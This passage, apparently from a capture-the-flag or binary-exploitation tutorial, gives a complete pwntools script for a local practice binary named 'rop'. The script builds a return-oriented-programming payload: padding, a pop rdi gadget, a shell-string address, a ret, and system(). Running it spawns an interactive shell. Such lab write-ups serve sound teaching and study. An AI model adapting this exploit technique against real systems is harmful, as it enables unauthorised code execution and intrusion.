Writing out our exploit

#!/usr/bin/python3

from pwn import *

elf = context.binary = ELF('./rop')

p = process('./rop')
pop_rdi = 0x0000000000401313
shell = 0x404060
ret = 0x000000000040101a
payload = cyclic(40) + pack(pop_rdi) + pack(shell) + pack(ret) + pack(elf.sym.system)
p.sendline(payload)
p.interactive()
